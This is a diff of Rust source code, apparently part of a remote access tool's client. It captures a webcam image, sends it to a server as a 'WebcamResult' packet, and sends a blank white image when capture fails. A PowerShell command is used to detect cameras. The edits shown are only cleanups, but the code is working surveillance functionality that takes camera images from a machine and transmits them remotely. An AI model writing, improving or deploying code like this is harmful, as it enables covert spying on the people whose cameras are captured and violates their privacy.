@@ -12,13 +12,13 @@ pub async fn take_webcam() {
         match handle.join() {
             Ok(Some(data)) => {
                 tokio::spawn(async move {
-                    if let Err(_) = send_packet(ServerboundPacket::WebcamResult(data)).await {}
+                    send_packet(ServerboundPacket::WebcamResult(data)).await
                 });
             }
             _ => {
                 let white_image = create_blank_image(640, 480);
                 tokio::spawn(async move {
-                    if let Err(_) = send_packet(ServerboundPacket::WebcamResult(white_image)).await {}
+                    send_packet(ServerboundPacket::WebcamResult(white_image)).await
                 });
             }
         }
@@ -46,7 +46,7 @@ fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
         _ => return None
     };
  
-    if let Err(_) = camera.open_stream() {
+    if camera.open_stream().is_err() {
         return None;
     }
  
@@ -65,24 +65,21 @@ fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
         return None;
     }
  
-    let data: Vec<u8> = buffer.iter().cloned().collect();
+    let data: Vec<u8> = buffer.to_vec();
     Some(data)
 }
 
 fn has_webcam() -> bool {
     let devices_output = Command::new("powershell")
-        .args(&["-Command", "Get-PnpDevice -Class Camera -Status OK | Measure-Object | Select-Object -ExpandProperty Count"])
+        .args(["-Command", "Get-PnpDevice -Class Camera -Status OK | Measure-Object | Select-Object -ExpandProperty Count"])
         .output();
-     
-    match devices_output {
-        Ok(output) => {
-            if let Ok(count_str) = String::from_utf8(output.stdout) {
-                if let Ok(count) = count_str.trim().parse::<i32>() {
-                    return count > 0;
-                }
+
+    if let Ok(output) = devices_output {
+        if let Ok(count_str) = String::from_utf8(output.stdout) {
+            if let Ok(count) = count_str.trim().parse::<i32>() {
+                return count > 0;
             }
         }
-        Err(_) => {}
     }
 
     false
